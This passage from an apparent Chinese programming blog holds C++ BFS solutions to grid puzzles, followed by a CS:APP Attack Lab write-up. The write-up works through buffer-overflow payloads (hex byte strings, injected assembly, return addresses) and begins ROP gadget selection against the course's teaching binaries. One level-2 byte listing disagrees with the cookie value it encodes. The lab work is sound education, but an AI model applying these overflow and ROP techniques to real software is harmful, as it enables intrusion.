class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">15</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF = <span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> dx[] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> dy[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>&#125;;<br><span class="hljs-type">int</span> n, m;<br><span class="hljs-type">char</span> MAP[MAXN][MAXN];<br><span class="hljs-type">int</span> vis[MAXN][MAXN], book[MAXN][MAXN];<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125; now, nex;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x1, <span class="hljs-type">int</span> y1, <span class="hljs-type">int</span> x2, <span class="hljs-type">int</span> y2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(vis, INF, <span class="hljs-built_in">sizeof</span>(vis));<br>    queue&lt;node&gt; que;<br>    vis[x1][y1] = <span class="hljs-number">0</span>;<br>    vis[x2][y2] = <span class="hljs-number">0</span>;<br>    now.x = x1;<br>    now.y = y1;<br>    que.<span class="hljs-built_in">push</span>(now);<br>    now.x = x2;<br>    now.y = y2;<br>    que.<span class="hljs-built_in">push</span>(now);<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        now = que.<span class="hljs-built_in">front</span>();<br>        que.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        &#123;<br>            <span class="hljs-type">int</span> xx = now.x + dx[i];<br>            <span class="hljs-type">int</span> yy = now.y + dy[i];<br>            <span class="hljs-keyword">if</span> (xx &gt;= <span class="hljs-number">0</span> &amp;&amp; yy &gt;= <span class="hljs-number">0</span> &amp;&amp; xx &lt; n &amp;&amp; yy &lt; m &amp;&amp; MAP[xx][yy] == <span class="hljs-string">&#x27;#&#x27;</span> &amp;&amp; vis[xx][yy] &gt; vis[now.x][now.y] + <span class="hljs-number">1</span>)<br>            &#123;<br>                vis[xx][yy] = vis[now.x][now.y] + <span class="hljs-number">1</span>;<br>                nex.x = xx;<br>                nex.y = yy;<br>                que.<span class="hljs-built_in">push</span>(nex);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (MAP[i][j] == <span class="hljs-string">&#x27;#&#x27;</span>)<br>                &#123;<br>                    res = <span class="hljs-built_in">max</span>(res, vis[i][j]);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t, ans;<br>    cin &gt;&gt; t;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> d = <span class="hljs-number">1</span>; d &lt;= t; d++)<br>    &#123;<br>        cin &gt;&gt; n &gt;&gt; m;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            cin &gt;&gt; MAP[i];<br>        &#125;<br>        <span class="hljs-type">int</span> temp;<br>        ans = INF;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (MAP[i][j] == <span class="hljs-string">&#x27;#&#x27;</span>)<br>                &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; n; k++)<br>                    &#123;<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> g = <span class="hljs-number">0</span>; g &lt; m; g++)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span> (MAP[k][g] == <span class="hljs-string">&#x27;#&#x27;</span>)<br>                            &#123;<br>                                temp = <span class="hljs-built_in">bfs</span>(i, j, k, g);<br>                                ans = <span class="hljs-built_in">min</span>(ans, temp);<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ans == INF)<br>            ans = <span class="hljs-number">-1</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Case &quot;</span> &lt;&lt; d &lt;&lt; <span class="hljs-string">&quot;: &quot;</span> &lt;&lt; ans &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="迷宫问题：3984-–-迷宫问题-poj-org"><a href="#迷宫问题：3984-–-迷宫问题-poj-org" class="headerlink" title="迷宫问题：3984 – 迷宫问题 (poj.org)"></a>迷宫问题：<a href="http://poj.org/problem?id=3984">3984 – 迷宫问题 (poj.org)</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> matrix[maxn][maxn];<br><span class="hljs-type">int</span> vis[maxn][maxn];<br><span class="hljs-type">int</span> dir[<span class="hljs-number">4</span>][<span class="hljs-number">2</span>] = &#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;;<br><br>node pre[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;node&gt; que;<br>    node str;<br>    str.x = <span class="hljs-number">0</span>;<br>    str.y = <span class="hljs-number">0</span>;<br>    que.<span class="hljs-built_in">push</span>(str);<br>    vis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        node now = que.<span class="hljs-built_in">front</span>();<br>        que.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">if</span> (now.x == <span class="hljs-number">4</span> &amp;&amp; now.y == <span class="hljs-number">4</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        &#123;<br>            node next;<br>            next.x = now.x + dir[i][<span class="hljs-number">0</span>];<br>            next.y = now.y + dir[i][<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (next.x &gt;= <span class="hljs-number">0</span> &amp;&amp; next.y &gt;= <span class="hljs-number">0</span> &amp;&amp; next.x &lt; <span class="hljs-number">5</span> &amp;&amp; next.y &lt; <span class="hljs-number">5</span> &amp;&amp; !matrix[next.x][next.y] &amp;&amp; !vis[next.x][next.y])<br>            &#123;<br>                vis[next.x][next.y] = <span class="hljs-number">1</span>;<br>                que.<span class="hljs-built_in">push</span>(next);<br>                pre[next.x][next.y] = now;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(node cur)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (cur.x == <span class="hljs-number">0</span> &amp;&amp; cur.y == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(0, 0)\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">print</span>(pre[cur.x][cur.y]); <span class="hljs-comment">//逆序输出</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d, %d)\n&quot;</span>, cur.x, cur.y);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;matrix[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">bfs</span>();<br>    node ed;<br>    ed.x = ed.y = <span class="hljs-number">4</span>;<br>    <span class="hljs-built_in">print</span>(ed);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>csapp lab3</title>
    <link href="/2021/08/25/lab3_attacklab/"/>
    <url>/2021/08/25/lab3_attacklab/</url>
    
    <content type="html"><![CDATA[<h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h4><p>简单的来说就是利用缓冲区溢出做攻击，在<code>getbuf</code>函数执行完毕之后，返回到<code>touch1()</code>函数，而不是<code>test()</code>函数。</p><p>通过<code>objdump -d</code>命令将<code>ctarget</code>程序进行反汇编。得到<code>getbuf</code>函数开辟了40个字节的空间，那么我们只需要将前40个字节给填满，接着在后面填上<code>touch1()</code>函数的地址就可以直接跳转到<code>touch1()</code>函数执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004017</span>a8 &lt;getbuf&gt;:<br>  <span class="hljs-number">4017</span>a8:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">28</span>          sub    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">4017</span>ac:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e7             mov    %rsp,%rdi<br>  <span class="hljs-number">4017</span>af:e8 <span class="hljs-number">8</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401</span>a40 &lt;Gets&gt;<br>  <span class="hljs-number">4017b</span>4:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%eax<br>  <span class="hljs-number">4017b</span>9:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">28</span>          add    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">4017b</span>d:c3                   retq   <br>  <span class="hljs-number">4017b</span>e:<span class="hljs-number">90</span>                   nop<br>  <span class="hljs-number">4017b</span>f:<span class="hljs-number">90</span>                   nop<br><br><span class="hljs-number">00000000004017</span>c0 &lt;touch1&gt;:<br>  <span class="hljs-number">4017</span>c0:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">4017</span>c4:c7 <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">2</span>d <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> movl   $<span class="hljs-number">0x1</span>,<span class="hljs-number">0x202d0e</span>(%rip)<br></code></pre></td></tr></table></figure><p>以上为截取的部分反汇编代码，可以看到<code>getbuf()</code>函数第一行就是<code>sub $0x28,%rsp</code>，开辟了40个字节的空间。第11行我们可以得出<code>touch1()</code>函数的地址为<code>0x4017c0</code>。所以我们要输入的字符串就得到了。对了，要特别注意的是intel都是<code>小端机</code>，我们要注意地址的写入方式。我们得到要输入的字符串为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>c0 <span class="hljs-number">17</span> <span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>最后通过<code>hex2raw</code>程序生成字节码进行注入，得到如下结果：<br><img src="/images/lab31.png"></p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>题目的意思是，我们同样需要跳转，但是我们需要跳转到<code>touch2()</code>函数，此外我们还需要传入我们自己的cookie作为形参。</p><p>我们就需要在字符串中注入一小段代码，我们在栈的范围内写入指令，再让<code>getbuf()</code>函数，跳转到我们写入的指令的首地址，在指令中执行<code>ret</code>进行二次返回，返回到<code>touch2()</code>函数就可以了。</p><p>首先我们知道函数第一个形参是放在<code>%rdi</code>寄存器中的，所以我们可以将cookie压入到<code>%rdi</code>寄存器中，然后将<code>touch2()</code>函数的地址进行压栈，接着一个<code>ret</code>指令将<code>touch2()</code>函数地址返回。所以，写下如下的汇编代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">mov $<span class="hljs-number">0x59b997fa</span>,%rdi<br>push $<span class="hljs-number">0x4017ec</span><br>ret<br></code></pre></td></tr></table></figure><p>那么如果将上述的汇编代码变成字节码呢？没错就是<code>objdump -d </code>。我们首先需要将该汇编文件进行编译，编译之后进行反汇编即可。<br><img src="/images/lab32.png"></p><p>所以我们得到的指令序列是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">48</span> c7 c7 fa <span class="hljs-number">97</span> <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">68</span> ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3<br></code></pre></td></tr></table></figure><p>接着我们需要知道栈顶的实际位置，也就是<code>%rsp</code>寄存器的值。怎么办呢？GDB!<br><img src="/images/lab33.png">，我们可以看到<code>%rsp</code>的值为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5561dc78</span><br></code></pre></td></tr></table></figure><p>所以，我们在栈的开始位置注入我们的代码，然后填充至40字节之后，在接下来的8个字节，就是返回地址，填入<code>%rsp</code>的值。同样得注意小端机的问题，最终我们得到的序列为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span> ec <span class="hljs-number">17</span><br><span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    <br></code></pre></td></tr></table></figure><p>最后通过<code>hex2raw</code>程序生成字节码进行注入，得到如下结果：<br><img src="/images/lab34.png"></p><h4 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h4><p>题目的意思是，和第二阶段不同的是，我们需要传入一个字符串作为参数，并且返回到<code>touch3()</code>函数，<code>touch3()</code>函数中还调用了<code>hexmatch()</code>函数，这个函数的功能是匹配我们自己的cookie值和传入的字符串是否相等。所以我们也需要将cookie的值传进去。</p><p>值得注意的是，在调用<code>hexmatch()</code>函数和<code>strncmp()</code>函数的时候，会把数据压入栈中，很可能会覆盖我们之前传入的数据，所以传进去字符串的位置要注意。<br><img src="/images/lab35.png"></p><p>将需要注入的代码转化为汇编之后再进行反汇编，得到指令序列为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3<br></code></pre></td></tr></table></figure><p>我们还需要得到cookie转为用ascii码进行表示，结果为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>我们可以得到最后的栈帧示意图：<br><img src="/images/lab36.png"></p><p>根据上述，我们得到最后输入的字符序列为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span> <br><span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span>   <br></code></pre></td></tr></table></figure><p>最后通过<code>hex2raw</code>程序生成字节码进行注入，得到如下结果：<br><img src="/images/lab37.png"></p><h4 id="Level4-ROP攻击"><a href="#Level4-ROP攻击" class="headerlink" title="Level4 ROP攻击"></a>Level4 ROP攻击</h4><p>第二部分要解决的同样是第一部分的后两个问题，只不过必须采取不同的方式来进行，因为这个<code>rtarget</code>这个程序对代码注入攻击采取了两者保护措施：<strong>栈随机化，标记内存中的栈段为不可执行</strong>。</p><p>在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以<code>ret</code>结尾，这一段指令序列，我们称之为<code>gadget</code>。</p><p>第一部分的第二个问题，我们要做的是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">mov $<span class="hljs-number">0x59b997fa</span>,%rdi<br>push $<span class="hljs-number">0x4017ec</span><br>ret<br></code></pre></td></tr></table></figure><p>但是<code>gadget</code>不可能有<code>mov $0x59b997fa,%rdi</code>，所以只能把<code>$0x59b997fa</code>放入栈中，再弹出来。</p><p>所以我们需要的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">popq %rax<br>movq %rax, %rdi<br></code></pre></td></tr></table></figure><p><code>popq %rax</code>的指令字节为：<code>58</code>。所以我们在<code>rtarget</code>程序的反汇编文件中寻找，找到了如下函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004019</span>a7 &lt;addval_219&gt;:<br>  <span class="hljs-number">4019</span>a7:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">51</span> <span class="hljs-number">73</span> <span class="hljs-number">58</span> <span class="hljs-number">90</span>    lea    <span class="hljs-number">-0x6fa78caf</span>(%rdi),%eax<br>  <span class="hljs-number">4019</span>ad:c3                   retq <br></code></pre></td></tr></table></figure><p>所以，<code>popq %rax</code>指令的地址为：<code>0x4019ab</code></p><p>接着寻找<code>movq %rax, %rdi</code>的指令字节</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004019</span>a0 &lt;addval_273&gt;:<br>  <span 